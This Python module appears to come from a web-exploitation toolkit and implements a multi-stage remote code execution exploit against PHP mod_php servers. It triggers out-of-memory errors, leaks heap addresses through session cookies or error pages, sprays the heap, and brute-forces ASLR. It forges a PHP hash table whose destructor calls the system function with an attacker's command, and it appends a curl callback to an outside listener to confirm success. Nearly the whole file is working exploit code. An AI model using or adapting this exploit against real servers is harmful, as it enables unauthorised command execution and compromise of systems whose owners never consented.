"""Chain D: pure OOM mod_php exploitation (no LFI required).

Uses a 4-strategy cascade to achieve RCE on mod_php targets:

  1. Cookie-based heap leak: OOM → dangling PS(id) → heap pointers in Set-Cookie
  2. Error-based leak: parse memory addresses from OOM error output
  3. Blind spray: multi-position spray at predicted heap positions (no leak)
  4. ASLR brute-force: iterate candidate libphp base addresses with known offsets

Requires mod_php SAPI. Hard 200-request budget with timing jitter.
37 offset profiles bundled (28 verified Debian + 9 estimated Ubuntu/RHEL).
"""

from __future__ import annotations

import json
import os
import socket
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

from .classifier import classify
from .evidence import RunStore
from .http import HttpClient
from .models import TargetProfile
from .util import new_nonce

__all__ = [
    "load_chain_d_profiles",
    "parse_heap_leak",
    "parse_error_leak",
    "generate_aslr_candidates",
    "build_blind_b2_body",
    "build_chain_d_payload",
    "send_b2_and_check",
    "try_chain_d_rce",
    # Underscore-prefixed aliases for backwards compatibility
    "_load_chain_d_profiles",
    "_parse_heap_leak",
    "_djbx33a",
    "_parse_error_leak",
    "_generate_aslr_candidates",
    "_build_blind_b2_body",
    "_build_chain_d_payload",
    "_send_b2_and_check",
    "_try_chain_d_rce",
]

_BUNDLED_OFFSETS = os.path.join(os.path.dirname(__file__), os.pardir, "data", "chain_d_offsets.json")


def _load_chain_d_profiles(custom_path: Optional[str] = None) -> Dict[str, Dict[str, int]]:
    """Load Chain D offset profiles from JSON (custom file or bundled default)."""
    path = custom_path or _BUNDLED_OFFSETS
    path = os.path.normpath(path)
    if not os.path.isfile(path):
        return {}
    with open(path) as f:
        data = json.load(f)
    profiles: Dict[str, Dict[str, int]] = {}
    for key, offsets in data.get("profiles", {}).items():
        if key.startswith("_"):
            continue
        if not isinstance(offsets, dict):
            continue
        parsed: Dict[str, Any] = {}
        for k, v in offsets.items():
            if isinstance(v, str):
                if v.startswith("0x") or v.startswith("0X"):
                    parsed[k] = int(v, 16)
                else:
                    parsed[k] = v
            elif isinstance(v, bool):
                parsed[k] = v
            elif isinstance(v, (int, float)):
                parsed[k] = int(v)
        profiles[key] = parsed
    return profiles


def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
    """Parse leaked heap data from a PHPSESSID Set-Cookie.

    After OOM + dangling PS(id), the session cookie contains raw heap bytes.
    We scan for pointers in the 0x7f... range (x86_64) or use alignment heuristics.

    Returns dict with 'libphp_base', 'main_chunk_base', 'zval_ptr_dtor_addr',
    or None if parsing fails.
    """
    MAX_COOKIE_PARSE = 65536
    if len(raw_cookie) < 64:
        return None
    if len(raw_cookie) > MAX_COOKIE_PARSE:
        raw_cookie = raw_cookie[:MAX_COOKIE_PARSE]

    from collections import Counter

    ptrs: List[int] = []
    for off in range(0, len(raw_cookie) - 7, 8):
        val = int.from_bytes(raw_cookie[off:off + 8], "little")
        if 0x7f0000000000 <= val <= 0x7fffffffffff:
            ptrs.append(val)
        elif 0x0000aaaa00000000 <= val <= 0x0000ffffffffffff:
            ptrs.append(val)

    if len(ptrs) < 5:
        return None

    bases_2m = Counter(p & ~0x1FFFFF for p in ptrs)
    if not bases_2m:
        return None

    sorted_bases = bases_2m.most_common()
    libphp_base_2m = sorted_bases[0][0]
    libphp_count = sorted_bases[0][1]

    libphp_ptrs = Counter(
        p for p in ptrs if (p & ~0x1FFFFF) == libphp_base_2m
    )
    zval_ptr_dtor_addr = libphp_ptrs.most_common(1)[0][0]

    # Adaptive main chunk detection: second-largest cluster that isn't libphp
    main_chunk_base = None
    if len(sorted_bases) >= 2:
        for base, count in sorted_bases[1:]:
            if count >= 10 and abs(base - libphp_base_2m) > 0x200000:
                main_chunk_base = base
                break

    # Fallback: try 4MiB alignment grouping
    if main_chunk_base is None and len(sorted_bases) >= 2:
        bases_4m = Counter(p & ~0x3FFFFF for p in ptrs)
        for base, count in bases_4m.most_common():
            if base != (libphp_base_2m & ~0x3FFFFF) and count >= 8:
                main_chunk_base = base
                break

    return {
        "zval_ptr_dtor_addr": zval_ptr_dtor_addr,
        "libphp_base": zval_ptr_dtor_addr & ~0x1FFFFF,
        "main_chunk_base": main_chunk_base,
        "pointer_count": len(ptrs),
        "unique_bases": len(bases_2m),
        "libphp_cluster_count": libphp_count,
        "arch_hint": "aarch64" if any(
            0x0000aaaa00000000 <= p <= 0x0000ffffffffffff for p in ptrs[:10]
        ) else "x86_64",
    }


def _djbx33a(data: bytes) -> int:
    """PHP's DJBX33A hash (zend_inline_hash_func)."""
    h = 5381
    for b in data:
        h = ((h * 33) + b) & 0xFFFFFFFFFFFFFFFF
    return h


def _parse_error_leak(body: str) -> Optional[Dict[str, Any]]:
    """Extract memory addresses from PHP OOM error output.

    PHP error messages with display_errors=On may contain pointer-like values
    in stack traces, memory addresses in "Allowed memory size" messages, or
    leaked addresses in error handler output (e.g. xdebug).
    """
    import re
    from collections import Counter

    # Scan for hex pointer patterns: 0x7f..., 0x55... (PIE), 0xaaaa... (aarch64)
    hex_ptrs = re.findall(r'0x([0-9a-fA-F]{10,16})', body)
    ptrs: List[int] = []
    for h in hex_ptrs:
        val = int(h, 16)
        if 0x7f0000000000 <= val <= 0x7fffffffffff:
            ptrs.append(val)
        elif 0x550000000000 <= val <= 0x55ffffffffffff:
            ptrs.append(val)
        elif 0x0000aaaa00000000 <= val <= 0x0000ffffffffffff:
            ptrs.append(val)

    # Also scan for decimal addresses that look like pointers (rare but possible)
    dec_addrs = re.findall(r'\b(\d{14,18})\b', body)
    for d in dec_addrs:
        val = int(d)
        if 0x7f0000000000 <= val <= 0x7fffffffffff:
            ptrs.append(val)

    if not ptrs:
        return None

    bases_2m = Counter(p & ~0x1FFFFF for p in ptrs)
    best_base, count = bases_2m.most_common(1)[0]

    arch_hint = "aarch64" if any(
        0x0000aaaa00000000 <= p <= 0x0000ffffffffffff for p in ptrs
    ) else "x86_64"

    return {
        "libphp_base": best_base,
        "main_chunk_base": None,
        "pointer_count": len(ptrs),
        "unique_bases": len(bases_2m),
        "arch_hint": arch_hint,
        "source": "error_output",
    }


def _generate_aslr_candidates(
    arch: str = "x86_64",
    known_offsets: Optional[Dict[str, int]] = None,
    max_candidates: int = 256,
) -> List[int]:
    """Generate candidate libphp base addresses for ASLR brute-force.

    On x86_64 Linux, shared libraries are loaded in the mmap region with
    ~28 bits of ASLR entropy. With 2MiB alignment, the search space is
    ~2^19 = 524K positions. We prioritize the most common address ranges
    seen in typical deployments.

    Returns list of candidate 2MiB-aligned base addresses, most likely first.
    """
    candidates: List[int] = []

    if arch == "aarch64":
        # aarch64: libraries typically at 0x0000aaaa... range, 2MiB aligned
        start = 0x0000aaaa00000000
        end = 0x0000aaac00000000
        step = 0x200000  # 2MiB
    else:
        # x86_64: libraries typically in 0x7f00... – 0x7fff... range
        # Common Docker/Debian range for libphp is narrower:
        # ~0x7f0000000000 to ~0x7f8000000000
        start = 0x7f0000000000
        end = 0x7f8000000000
        step = 0x200000  # 2MiB

    # Generate candidates from center of the typical range outward
    center = (start + end) // 2
    center = center & ~0x1FFFFF  # align to 2MiB

    offsets = [0]
    for i in range(1, max_candidates):
        offsets.append(i * step)
        offsets.append(-i * step)

    for off in offsets[:max_candidates]:
        addr = center + off
        if start <= addr < end:
            candidates.append(addr)

    return candidates


def _build_blind_b2_body(
    command: str,
    offsets: Dict[str, int],
    libphp_base: int,
    spray: Dict[str, int],
    listener: Optional[Any] = None,
    canary_nonce: str = "",
    main_chunk_candidates: Optional[List[int]] = None,
) -> Tuple[bytes, str]:
    """Build a B2 body that sprays the payload at multiple candidate heap positions.

    Returns (body_bytes, boundary).
    """
    import struct

    if listener:
        callback_url = listener.callback_url(canary_nonce)
        full_cmd = f"{command}; curl -s {callback_url} >/dev/null 2>&1"
    else:
        full_cmd = command

    b2_boundary = "B" * 10
    b2_body = bytearray()

    # If we have specific chunk candidates, spray each one
    if main_chunk_candidates:
        for idx, chunk_base in enumerate(main_chunk_candidates):
            payload = _build_chain_d_payload(full_cmd, offsets, libphp_base, chunk_base)
            b2_body.extend(f"--{b2_boundary}\r\n".encode())
            b2_body.extend(
                f"Content-Disposition: form-data; "
                f"name=\"PHP_SESSION_UPLOAD_PROGRESS_{idx:04d}\"\r\n\r\n".encode()
            )
            b2_body.extend(payload)
            b2_body.extend(b"\r\n")
    else:
        payload = _build_chain_d_payload(full_cmd, offsets, libphp_base, libphp_base)
        b2_body.extend(f"--{b2_boundary}\r\n".encode())
        b2_body.extend(
            b"Content-Disposition: form-data; "
            b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        )
        b2_body.extend(payload)
        b2_body.extend(b"\r\n")

    # Heap spray padding
    for i in range(spray.get("pad_blocks", 30)):
        b2_body.extend(f"--{b2_boundary}\r\n".encode())
        b2_body.extend(
            f"Content-Disposition: form-data; name=\"pad{i:04d}\"\r\n\r\n".encode()
        )
        b2_body.extend(b"P" * spray.get("pad_size", 8000) + b"\r\n")
    b2_body.extend(f"--{b2_boundary}--\r\n".encode())

    return bytes(b2_body), b2_boundary


def _build_chain_d_payload(
    command: str,
    profile_offsets: Dict[str, int],
    libphp_base: int,
    main_chunk_base: int,
) -> bytes:
    """Build the B2 payload: fake zend_array + refcount spray that
    redirects pDestructor → zif_system with our command string.
    """
    import struct

    zif_system = libphp_base + profile_offsets["zif_system"]
    fake_array_off = profile_offsets["fake_array_S"]
    hsv_off = profile_offsets["hsv"]

    fake_array_addr = main_chunk_base + fake_array_off
    hsv_addr = main_chunk_base + hsv_off

    # Build fake zend_array (HashTable) structure:
    # - gc.refcount=2, gc.u.type_info = IS_ARRAY (7) | collectable flag
    # - nTableMask = -2  (one bucket)
    # - arData → points to a fake Bucket we place after
    # - nNumUsed = 1, nNumOfElements = 1
    # - nTableSize = 2
    # - pDestructor → zif_system
    cmd_bytes = command.encode("utf-8") + b"\x00"

    ht = bytearray(56)
    # gc: refcount=2, type=7 (IS_ARRAY), flags with GC_COLLECTABLE
    struct.pack_into("<I", ht, 0, 2)           # refcount
    struct.pack_into("<I", ht, 4, 0x10 | 7)    # type_info: IS_ARRAY | collectable
    # nTableMask
    struct.pack_into("<I", ht, 8, 0xFFFFFFFE)  # -2 as uint32
    # arData pointer (we place the Bucket right after the HashTable)
    fake_bucket_addr = fake_array_addr + 56
    struct.pack_into("<Q", ht, 16, fake_bucket_addr)
    # nNumUsed, nNumOfElements
    struct.pack_into("<I", ht, 24, 1)
    struct.pack_into("<I", ht, 28, 1)
    # nTableSize
    struct.pack_into("<I", ht, 32, 2)
    # nInternalPointer
    struct.pack_into("<I", ht, 36, 0)
    # nNextFreeElement
    struct.pack_into("<q", ht, 40, 1)
    # pDestructor → zif_system
    struct.pack_into("<Q", ht, 48, zif_system)

    # Fake Bucket: val is a zval with type=IS_STRING, value points to our command
    bucket = bytearray(32)
    cmd_str_addr = fake_bucket_addr + 32
    struct.pack_into("<Q", bucket, 0, cmd_str_addr)  # zval.value.str
    struct.pack_into("<I", bucket, 8, 6)              # type = IS_STRING
    struct.pack_into("<I", bucket, 12, 0)             # type_flags
    struct.pack_into("<Q", bucket, 16, 0)             # h (hash)
    struct.pack_into("<Q", bucket, 24, 0)             # key = NULL (numeric)

    # Fake zend_string for the command
    zstr = bytearray(24 + len(cmd_bytes))
    struct.pack_into("<I", zstr, 0, 1)                # gc.refcount
    struct.pack_into("<I", zstr, 4, 6)                # type_info: IS_STRING
    struct.pack_into("<Q", zstr, 8, _djbx33a(cmd_bytes[:-1]))  # h (PHP hash)
    struct.pack_into("<Q", zstr, 16, len(cmd_bytes) - 1)  # len (without NUL)
    zstr[24:24 + len(cmd_bytes)] = cmd_bytes

    return bytes(ht) + bytes(bucket) + bytes(zstr)


def _send_b2_and_check(
    client: HttpClient,
    profile: TargetProfile,
    store: RunStore,
    b2_body: bytes,
    b2_boundary: str,
    session_id: str,
    listener: Optional[Any],
    canary_nonce: str,
    timeout: float,
    attempt: int,
    strategy: str,
    result: Dict[str, Any],
) -> bool:
    """Send B2 payload and check for RCE confirmation. Returns True on success."""
    from .discover import _body_text
    import urllib.parse

    b2_headers = {
        "Content-Type": f"multipart/form-data; boundary={b2_boundary}",
        "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
    }
    try:
        b2_exchange = client.request(
            "POST", profile.base_url,
            body=b2_body, headers=b2_headers,
            chunked=True, nonce=new_nonce("P2SDB2"), timeout=timeout,
        )
        b2_class = classify(b2_exchange, nonce="")
        b2_item = store.add_http(
            b2_exchange, b2_class,
            scenario_id="chain-d-b2-rce",
            trust="medium",
            notes=f"Chain D B2: {strategy} (attempt {attempt + 1})",
        )
        result["request_refs"].append(b2_item.id)
    except Exception as e:
        result["notes"].append(f"B2 failed: {e}")
        return False

    body_text = _body_text(b2_exchange)

    if listener:
        cb = listener.wait_for_callback(canary_nonce, timeout=8.0)
        if cb:
            result["callback_received"] = True
            result["success"] = True
            result["notes"].append(
                f"RCE confirmed via {strategy} (attempt {attempt + 1})"
            )
            return True

    if body_text:
        result["output"] = body_text[:2000]
        if body_text.strip():
            result["notes"].append(
                f"B2 produced output via {strategy} (attempt {attempt + 1}, "
                f"UNVERIFIED — no callback listener)"
            )

    return False


def _try_chain_d_rce(
    client: HttpClient,
    profile: TargetProfile,
    store: RunStore,
    command: str,
    listener: Optional[Any],
    canary_nonce: str,
    timeout: float = 30.0,
    workers: int = 5,
    chain_d_offsets_path: Optional[str] = None,
    max_attempts: int = 3,
) -> Dict[str, Any]:
    """Try Chain D: pure OOM exploitation on mod_php (no LFI needed).

    Uses three leak strategies in order of reliability:
      1. Cookie leak: OOM → dangling PS(id) → heap bytes in Set-Cookie
      2. Error-based leak: parse memory addresses from OOM error output
      3. Blind spray: spray payload at predicted heap positions (no leak)

    After exhausting leak-based strategies, falls back to partial ASLR
    brute-force: iterate candidate libphp base addresses with known offsets.
    """
    from .discover import (
        build_oom_probe_body, build_oom_lite_body,
        hold_workers, release_workers, _body_text,
        DiscoverBudget, _safe_get,
    )
    import urllib.parse
    import random

    MAX_CHAIN_D_REQUESTS = 200

    def _jitter_sleep(base: float = 0.05, spread: float = 0.15) -> None:
        time.sleep(base + random.random() * spread)
    chain_d_reqs = 0

    result: Dict[str, Any] = {
        "success": False, "output": None, "callback_received": False,
        "notes": [], "request_refs": [], "leak_info": None,
    }

    def _budget_ok() -> bool:
        nonlocal chain_d_reqs
        if chain_d_reqs >= MAX_CHAIN_D_REQUESTS:
            result["notes"].append(f"Chain D budget exhausted ({chain_d_reqs}/{MAX_CHAIN_D_REQUESTS})")
            return False
        return True

    parsed_url = urlsplit(profile.base_url)
    host = parsed_url.hostname or "127.0.0.1"
    use_tls = parsed_url.scheme == "https"
    port = parsed_url.port or (443 if use_tls else 80)
    boundary = "C" * 10

    # --- Rank candidate offset profiles (best match first) ---
    chain_d_profiles = _load_chain_d_profiles(chain_d_offsets_path)
    php_version = getattr(profile, "php_version", None)
    sapi_hint = getattr(profile, "sapi", None)

    distro_hint = None
    build_meta = getattr(profile, "build_metadata", {}) or {}
    if build_meta.get("distro"):
        distro_hint = build_meta["distro"]
    packaging = getattr(profile, "packaging", None)
    if not distro_hint and packaging:
        for d in ("trixie", "bookworm", "bullseye", "buster", "noble", "jammy",
                   "el9", "el8", "alpine"):
            if d in packaging.lower():
                distro_hint = d
                break

    candidates: List[Tuple[str, Dict[str, int], str]] = []
    seen_keys: set = set()
    partial = ".".join(php_version.split(".")[:2]) if php_version else None

    def _tier_tag(base_tier: str, offs: Dict[str, Any]) -> str:
        return base_tier + (",unverified" if offs.get("verified") is False else "")

    if distro_hint:
        for key, offs in chain_d_profiles.items():
            if (php_version and php_version in key
                    and sapi_hint and sapi_hint in key
                    and distro_hint in key):
                candidates.append((key, offs, _tier_tag("exact+distro", offs)))
                seen_keys.add(key)

    for key, offs in chain_d_profiles.items():
        if (key not in seen_keys and php_version and php_version in key
                and sapi_hint and sapi_hint in key):
            candidates.append((key, offs, _tier_tag("exact", offs)))
            seen_keys.add(key)

    for key, offs in chain_d_profiles.items():
        if key not in seen_keys and php_version and php_version in key:
            tier = "version+distro" if distro_hint and distro_hint in key else "version"
            candidates.append((key, offs, tier))
            seen_keys.add(key)

    if partial:
        for key, offs in chain_d_profiles.items():
            if key not in seen_keys and partial in key:
                tier = "partial+distro" if distro_hint and distro_hint in key else "partial"
                candidates.append((key, offs, tier))
                seen_keys.add(key)

    for key, offs in chain_d_profiles.items():
        if key not in seen_keys and "x86_64" in key:
            candidates.append((key, offs, "arch-fallback"))
            seen_keys.add(key)

    if not candidates:
        result["notes"].append("no matching offset profile found")
        return result

    result["notes"].append(
        f"found {len(candidates)} candidate profile(s): "
        + ", ".join(f"{k} ({t})" for k, _, t in candidates[:5])
    )

    # --- Pin workers ---
    holders: List[socket.socket] = []
    try:
        holders = hold_workers(host, port, workers, timeout=10.0, use_tls=use_tls)
        if len(holders) < max(1, workers - 2):
            result["notes"].append(f"only pinned {len(holders)}/{workers - 1} workers")
    except Exception as e:
        result["notes"].append(f"worker pinning failed: {e}")

    SPRAY_CONFIGS = [
        {"parts": 100, "depth": 16, "pad_blocks": 30, "pad_size": 8000},
        {"parts": 200, "depth": 24, "pad_blocks": 50, "pad_size": 12000},
        {"parts": 400, "depth": 32, "pad_blocks": 80, "pad_size": 16000},
    ]

    try:
        # ===================================================================
        # STRATEGY 1: Cookie-based heap leak (original flow)
        # ===================================================================
        result["notes"].append("=== Strategy 1: cookie-based heap leak ===")
        total_leak_attempts = max(max_attempts, len(candidates))

        for attempt in range(total_leak_attempts):
            if result["success"] or not _budget_ok():
                break
            cand_idx = attempt % len(candidates)
            profile_key, offsets, match_tier = candidates[cand_idx]
            spray = SPRAY_CONFIGS[min(attempt, len(SPRAY_CONFIGS) - 1)]
            session_id = f"{'A' * 26}{attempt:02d}"

            if attempt > 0:
                result["notes"].append(
                    f"--- leak attempt {attempt + 1}/{total_leak_attempts} "
                    f"profile={profile_key} ({match_tier}) ---"
                )
            else:
                result["notes"].append(f"using profile: {profile_key} ({match_tier})")

            # A1: OOM trigger
            result["notes"].append("A1: sending OOM trigger")
            a1_body = build_oom_probe_body()
            a1_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={session_id}",
            }
            try:
                a1_exchange = client.request(
                    "POST", profile.base_url,
                    body=a1_body, headers=a1_headers,
                    chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
                )
                a1_class = classify(a1_exchange, nonce="")
                a1_item = store.add_http(
                    a1_exchange, a1_class,
                    scenario_id="chain-d-a1-oom",
                    trust="medium",
                    notes=f"Chain D A1: OOM trigger (attempt {attempt + 1})",
                )
                result["request_refs"].append(a1_item.id)
                chain_d_reqs += 1
                if a1_exchange.status == 413:
                    result["notes"].append(
                        "A1 got 413 — chunked TE likely stripped by WAF/proxy, aborting Chain D"
                    )
                    return result
                if a1_exchange.status not in (500, 502):
                    result["notes"].append(f"A1 unexpected status: {a1_exchange.status}")
            except Exception as e:
                result["notes"].append(f"A1 failed: {e}")
                continue

            _jitter_sleep()

            # ---- Try error-based leak from A1 response (Strategy 2, opportunistic) ----
            a1_body_text = _body_text(a1_exchange)
            error_leak = _parse_error_leak(a1_body_text) if a1_body_text else None
            if error_leak:
                result["notes"].append(
                    f"error leak: found {error_leak['pointer_count']} ptrs, "
                    f"libphp base=0x{error_leak['libphp_base']:x} (from error output)"
                )

            # B1: read heap leak from cookie
            result["notes"].append("B1: reading heap leak via cookie")
            b1_headers = {"Cookie": f"PHPSESSID={session_id}"}
            try:
                b1_exchange = client.request(
                    "GET", profile.base_url,
                    headers=b1_headers,
                    nonce=new_nonce("P2SDB1"), timeout=timeout,
                )
                b1_class = classify(b1_exchange, nonce="")
                b1_item = store.add_http(
                    b1_exchange, b1_class,
                    scenario_id="chain-d-b1-leak",
                    trust="medium",
                    notes=f"Chain D B1: heap leak (attempt {attempt + 1})",
                )
                result["request_refs"].append(b1_item.id)
                chain_d_reqs += 1
            except Exception as e:
                result["notes"].append(f"B1 request failed: {e}")
                continue

            # Try to extract leak from cookie
            set_cookie = ""
            hdrs = b1_exchange.response_headers or {}
            for hdr_name, hdr_val in (hdrs.items() if isinstance(hdrs, dict) else hdrs):
                if hdr_name.lower() == "set-cookie" and "PHPSESSID=" in hdr_val:
                    set_cookie = hdr_val
                    break

            leak = None
            if set_cookie:
                cookie_parts = set_cookie.split(";")[0]
                if "=" in cookie_parts:
                    raw_session = cookie_parts.split("=", 1)[1]
                    try:
                        leaked_bytes = urllib.parse.unquote_to_bytes(raw_session)
                    except Exception:
                        leaked_bytes = raw_session.encode("latin-1")

                    result["notes"].append(f"B1: got {len(leaked_bytes)} bytes from cookie")

                    if len(leaked_bytes) >= 100:
                        leak = _parse_heap_leak(leaked_bytes)
                        if leak:
                            result["leak_info"] = leak
                            result["notes"].append(
                                f"B1: cookie leak success — libphp=0x{leak['libphp_base']:x}, "
                                f"chunk=0x{leak['main_chunk_base']:x}" if leak["main_chunk_base"]
                                else f"B1: cookie leak partial — libphp=0x{leak['libphp_base']:x}, no chunk"
                            )

            # Determine best available addresses
            libphp_base = None
            main_chunk_base = None

            if leak and leak.get("main_chunk_base"):
                libphp_base = leak["libphp_base"]
                main_chunk_base = leak["main_chunk_base"]
                strategy_name = "cookie-leak"
            elif leak:
                libphp_base = leak["libphp_base"]
                strategy_name = "cookie-leak-partial"
            elif error_leak:
                libphp_base = error_leak["libphp_base"]
                strategy_name = "error-leak"
            else:
                result["notes"].append("B1: no leak obtained — will try blind strategies later")
                continue

            # If we have libphp_base but no main_chunk, estimate it
            if main_chunk_base is None:
                main_chunk_base = libphp_base - 0x200000
                result["notes"].append(
                    f"estimating main_chunk_base=0x{main_chunk_base:x} "
                    f"(libphp_base - 2MiB)"
                )

            # A2: shape heap
            result["notes"].append(f"A2: heap spray ({strategy_name})")
            a2_body = build_oom_lite_body(
                parts=spray["parts"], depth=spray["depth"],
            )
            a2_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
            }
            try:
                a2_exchange = client.request(
                    "POST", profile.base_url,
                    body=a2_body, headers=a2_headers,
                    chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
                )
                a2_class = classify(a2_exchange, nonce="")
                a2_item = store.add_http(
                    a2_exchange, a2_class,
                    scenario_id="chain-d-a2-prep",
                    trust="medium",
                    notes=f"Chain D A2: heap spray ({strategy_name})",
                )
                result["request_refs"].append(a2_item.id)
                chain_d_reqs += 1
            except Exception as e:
                result["notes"].append(f"A2 failed: {e}")
                continue

            _jitter_sleep()

            # B2: send payload
            result["notes"].append(f"B2: RCE payload via {strategy_name}")
            b2_body, b2_boundary = _build_blind_b2_body(
                command, offsets, libphp_base, spray,
                listener, canary_nonce,
                main_chunk_candidates=[main_chunk_base],
            )
            chain_d_reqs += 1
            if _send_b2_and_check(
                client, profile, store, b2_body, b2_boundary,
                session_id, listener, canary_nonce,
                timeout, attempt, strategy_name, result,
            ):
                break

            result["notes"].append(f"leak attempt {attempt + 1} did not confirm RCE")

        if result["success"]:
            return result

        # ===================================================================
        # STRATEGY 3: Blind spray (no leak required)
        # ===================================================================
        result["notes"].append("=== Strategy 2: blind spray (no leak needed) ===")

        # Use best candidate profile; generate chunk base estimates
        best_key, best_offsets, best_tier = candidates[0]
        result["notes"].append(f"blind spray using profile: {best_key}")

        # Common main_chunk positions relative to typical libphp locations
        # After OOM, zend_mm heap is in a semi-predictable state
        chunk_offsets = [
            -0x200000, -0x400000, 0x200000, 0, -0x600000,
            0x400000, -0x800000, 0x600000,
        ]

        for blind_attempt in range(min(3, max_attempts)):
            if not _budget_ok():
                break
            spray = SPRAY_CONFIGS[min(blind_attempt, len(SPRAY_CONFIGS) - 1)]
            session_id = f"{'B' * 26}{blind_attempt:02d}"

            result["notes"].append(
                f"--- blind attempt {blind_attempt + 1}/3 "
                f"(spray: parts={spray['parts']}) ---"
            )

            # A1: OOM trigger
            a1_body = build_oom_probe_body()
            a1_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={session_id}",
            }
            try:
                a1_exchange = client.request(
                    "POST", profile.base_url,
                    body=a1_body, headers=a1_headers,
                    chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
                )
                classify(a1_exchange, nonce="")
                store.add_http(
                    a1_exchange, classify(a1_exchange, nonce=""),
                    scenario_id="chain-d-blind-a1",
                    trust="medium",
                    notes=f"Chain D blind A1 (attempt {blind_attempt + 1})",
                )
                chain_d_reqs += 1
            except Exception as e:
                result["notes"].append(f"blind A1 failed: {e}")
                continue

            # A2: shape heap
            a2_body = build_oom_lite_body(
                parts=spray["parts"], depth=spray["depth"],
            )
            a2_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
            }
            try:
                client.request(
                    "POST", profile.base_url,
                    body=a2_body, headers=a2_headers,
                    chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
                )
                chain_d_reqs += 1
            except Exception:
                pass

            _jitter_sleep()

            # B2: spray payload at multiple candidate positions
            # For each candidate profile, try several chunk base offsets
            for cand_key, cand_offs, _ in candidates[:3]:
                chunk_candidates = []
                # Use common heap base patterns (mmap region, 2MiB aligned)
                for base_hint in [0x7f4000000000, 0x7f2000000000, 0x7f6000000000]:
                    for chunk_off in chunk_offsets[:4]:
                        chunk_candidates.append(base_hint + chunk_off)

                result["notes"].append(
                    f"B2: blind spray with {len(chunk_candidates)} chunk candidates "
                    f"({cand_key})"
                )
                b2_body, b2_boundary = _build_blind_b2_body(
                    command, cand_offs, 0x7f4000000000, spray,
                    listener, canary_nonce,
                    main_chunk_candidates=chunk_candidates,
                )
                chain_d_reqs += 1
                if _send_b2_and_check(
                    client, profile, store, b2_body, b2_boundary,
                    session_id, listener, canary_nonce,
                    timeout, blind_attempt, f"blind-spray({cand_key})", result,
                ):
                    break
            if result["success"]:
                break

        if result["success"]:
            return result

        # ===================================================================
        # STRATEGY 4: Partial ASLR brute-force
        # ===================================================================
        if not listener:
            result["notes"].append(
                "=== Strategy 3: ASLR brute skipped (needs --callback-port for confirmation) ==="
            )
        else:
            result["notes"].append("=== Strategy 3: partial ASLR brute-force ===")

            best_key, best_offsets, _ = candidates[0]
            arch_hint = "aarch64" if "aarch64" in best_key else "x86_64"
            aslr_bases = _generate_aslr_candidates(arch=arch_hint, max_candidates=64)

            result["notes"].append(
                f"trying {len(aslr_bases)} ASLR candidates ({arch_hint})"
            )

            spray = SPRAY_CONFIGS[-1]  # max spray
            OOM_REFRESH_INTERVAL = 8  # re-trigger OOM every N B2 attempts

            for brute_idx, candidate_base in enumerate(aslr_bases):
                if result["success"]:
                    break
                if not _budget_ok():
                    break

                # Re-trigger A1+A2 OOM periodically to keep heap state fresh
                if brute_idx % OOM_REFRESH_INTERVAL == 0:
                    session_id = f"{'C' * 26}{brute_idx:02d}"
                    a1_body = build_oom_probe_body()
                    try:
                        client.request(
                            "POST", profile.base_url,
                            body=a1_body, headers={
                                "Content-Type": f"multipart/form-data; boundary={boundary}",
                                "Cookie": f"PHPSESSID={session_id}",
                            },
                            chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
                        )
                        chain_d_reqs += 1
                    except Exception:
                        pass
                    a2_body = build_oom_lite_body(
                        parts=spray["parts"], depth=spray["depth"],
                    )
                    try:
                        client.request(
                            "POST", profile.base_url,
                            body=a2_body, headers={
                                "Content-Type": f"multipart/form-data; boundary={boundary}",
                                "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
                            },
                            chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
                        )
                        chain_d_reqs += 1
                    except Exception:
                        pass

                _jitter_sleep()

                # Estimate main chunk relative to libphp
                chunk_base = candidate_base - 0x200000

                b2_body, b2_boundary = _build_blind_b2_body(
                    command, best_offsets, candidate_base, spray,
                    listener, canary_nonce,
                    main_chunk_candidates=[
                        chunk_base,
                        chunk_base - 0x200000,
                        chunk_base + 0x200000,
                    ],
                )

                chain_d_reqs += 1
                if _send_b2_and_check(
                    client, profile, store, b2_body, b2_boundary,
                    session_id, listener, canary_nonce,
                    timeout, brute_idx, f"aslr-brute(0x{candidate_base:x})", result,
                ):
                    break

                if (brute_idx + 1) % 16 == 0:
                    result["notes"].append(
                        f"ASLR brute: {brute_idx + 1}/{len(aslr_bases)} tried"
                    )

        if not result["success"]:
            result["notes"].append(
                "all strategies exhausted without confirmed RCE"
            )

    finally:
        release_workers(holders)

    result["requests_used"] = chain_d_reqs
    return result


# Public aliases without underscore prefix
load_chain_d_profiles = _load_chain_d_profiles
parse_heap_leak = _parse_heap_leak
parse_error_leak = _parse_error_leak
generate_aslr_candidates = _generate_aslr_candidates
build_blind_b2_body = _build_blind_b2_body
build_chain_d_payload = _build_chain_d_payload
send_b2_and_check = _send_b2_and_check
try_chain_d_rce = _try_chain_d_rce
